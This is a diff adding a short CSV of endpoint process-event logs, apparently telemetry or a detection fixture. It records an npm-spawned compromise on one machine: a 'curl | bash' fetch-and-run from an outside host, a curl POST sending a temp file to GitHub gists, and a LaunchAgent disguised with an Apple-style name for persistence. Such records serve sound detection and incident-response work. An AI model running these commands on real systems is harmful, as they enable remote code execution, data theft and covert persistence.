@@ -1,0 +1,4 @@
+name,hostIdentifier,calendarTime,action,columns
+process_events,ENG-MBP-14,Wed Mar 25 08:41:14 2026 PDT,added,"{""cmdline"":""curl -fsSL https://cdn-cache-helper.net/bootstrap.sh | bash"",""path"":""/bin/bash"",""parent"":""npm""}"
+process_events,ENG-MBP-14,Wed Mar 25 08:41:17 2026 PDT,added,"{""cmdline"":""curl -X POST https://api.github.com/gists -d @/tmp/b.txt"",""path"":""/usr/bin/curl"",""parent"":""bash""}"
+process_events,ENG-MBP-14,Wed Mar 25 08:43:09 2026 PDT,added,"{""cmdline"":""launchctl bootstrap gui/501 /Users/n.kade/Library/LaunchAgents/com.apple.bundlecache.plist"",""path"":""/bin/launchctl"",""parent"":""bash""}"
